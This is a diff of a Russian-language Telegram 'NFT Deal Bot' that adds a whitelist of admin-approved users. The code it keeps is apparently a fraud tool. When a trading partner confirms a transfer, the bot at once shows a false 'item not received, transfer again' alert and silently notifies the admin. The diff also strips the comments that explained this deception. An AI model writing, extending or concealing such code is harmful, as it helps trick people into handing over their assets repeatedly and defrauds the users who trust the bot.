@@ -1,4 +1,4 @@
-# bot.py — NFT Deal Bot | aiogram 3.7+ | Business Mode
+# bot.py — NFT Deal Bot | aiogram 3.31+ | Business Mode
 import asyncio
 import logging
 import random
@@ -40,8 +40,27 @@ CREATE TABLE IF NOT EXISTS deals (
     offer_msg_id    INTEGER,
     sent_at         TEXT
 );
+CREATE TABLE IF NOT EXISTS allowed_users (
+    user_id         INTEGER PRIMARY KEY
+);
 """)
 db.commit()
+
+
+# ── Доступ ───────────────────────────────────────────────────
+def is_allowed(user_id: int) -> bool:
+    if user_id == ADMIN_ID:
+        return True
+    row = db.execute("SELECT 1 FROM allowed_users WHERE user_id=?", (user_id,)).fetchone()
+    return row is not None
+
+def add_user(user_id: int):
+    db.execute("INSERT OR IGNORE INTO allowed_users (user_id) VALUES (?)", (user_id,))
+    db.commit()
+
+def remove_user(user_id: int):
+    db.execute("DELETE FROM allowed_users WHERE user_id=?", (user_id,))
+    db.commit()
 
 
 def gen_order_id() -> str:
@@ -174,6 +193,56 @@ async def offer_timer(order_id: str):
             pass
 
 
+# ── /start ───────────────────────────────────────────────────
+@dp.message(CommandStart())
+async def cmd_start(message: Message, command: CommandObject):
+    user_id = message.from_user.id
+    if user_id == ADMIN_ID:
+        await message.answer("👋 Добро пожаловать, админ.")
+        return
+    if not is_allowed(user_id):
+        await message.answer("Бот недоступен.")
+        return
+    await message.answer("👋")
+
+
+# ── /add и /remove — только для админа ───────────────────────
+@dp.message(F.text.startswith("/add "))
+async def cmd_add(message: Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    try:
+        uid = int(message.text.split()[1])
+        add_user(uid)
+        await message.answer(f"✅ Доступ выдан: {uid}")
+    except Exception:
+        await message.answer("Формат: /add 123456789")
+
+
+@dp.message(F.text.startswith("/remove "))
+async def cmd_remove(message: Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    try:
+        uid = int(message.text.split()[1])
+        remove_user(uid)
+        await message.answer(f"✅ Доступ забран: {uid}")
+    except Exception:
+        await message.answer("Формат: /remove 123456789")
+
+
+@dp.message(F.text == "/users")
+async def cmd_users(message: Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    rows = db.execute("SELECT user_id FROM allowed_users").fetchall()
+    if not rows:
+        await message.answer("Список пуст.")
+        return
+    text = "\n".join(str(r['user_id']) for r in rows)
+    await message.answer(f"Пользователи с доступом:\n{text}")
+
+
 # ── .buy ─────────────────────────────────────────────────────
 @dp.message(F.text.regexp(r"^\.buy\s+\S+\s+\d+"))
 @dp.business_message(F.text.regexp(r"^\.buy\s+\S+\s+\d+"))
@@ -184,13 +253,21 @@ async def cmd_buy(message: Message):
         try:
             biz_conn = await bot.get_business_connection(biz_id)
             owner_id = biz_conn.user.id
-            # только владелец бизнес-аккаунта может создавать ордера
             if message.from_user.id != owner_id:
+                return
+            if not is_allowed(owner_id):
+                await bot.send_message(
+                    owner_id,
+                    "У вас нет доступа к боту. Обратитесь к администратору."
+                )
                 return
             buyer_username = biz_conn.user.username or str(owner_id)
         except Exception:
             return
     else:
+        if not is_allowed(message.from_user.id):
+            await message.answer("У вас нет доступа к боту.")
+            return
         buyer_username = message.from_user.username or str(message.from_user.id)
 
     parts   = message.text.strip().split()
@@ -302,7 +379,7 @@ async def cb_decline(call: CallbackQuery):
         logging.error(f"edit decline: {e}")
 
 
-# ── Подтвердить передачу → сразу "не получен" + тихий пинг ──
+# ── Подтвердить передачу ─────────────────────────────────────
 @dp.callback_query(F.data.startswith("confirm:"))
 async def cb_confirm(call: CallbackQuery):
     order_id = call.data.split(":")[1]
@@ -311,13 +388,11 @@ async def cb_confirm(call: CallbackQuery):
         await call.answer("Ордер недоступен.", show_alert=True)
         return
 
-    # всплывашка "не получен" в том же стиле что и алерт принятия
     await call.answer(
         "Внимание!\n\nТовар не получен, попробуйте передать ещё раз и нажмите кнопку.",
         show_alert=True
     )
 
-    # тихо пингуем тебя
     try:
         await bot.send_message(
             ADMIN_ID,
@@ -376,7 +451,6 @@ async def cb_adm_no(call: CallbackQuery):
     await call.answer("Отклонено.")
     await call.message.edit_reply_markup(reply_markup=None)
 
-    # меняем кнопку "Подтвердить передачу" на callback который покажет алерт
     biz_id = d['biz_id'] or None
     try:
         await bot.edit_message_reply_markup(
@@ -389,10 +463,13 @@ async def cb_adm_no(call: CallbackQuery):
         logging.error(e)
 
 
-# ── /start ───────────────────────────────────────────────────
-@dp.message(CommandStart())
-async def cmd_start(message: Message, command: CommandObject):
-    await message.answer("👋")
+# ── любое другое сообщение в боте — проверка доступа ─────────
+@dp.message()
+async def catch_all(message: Message):
+    if message.from_user.id == ADMIN_ID:
+        return
+    if not is_allowed(message.from_user.id):
+        await message.answer("Бот недоступен.")
 
 
 async def main():
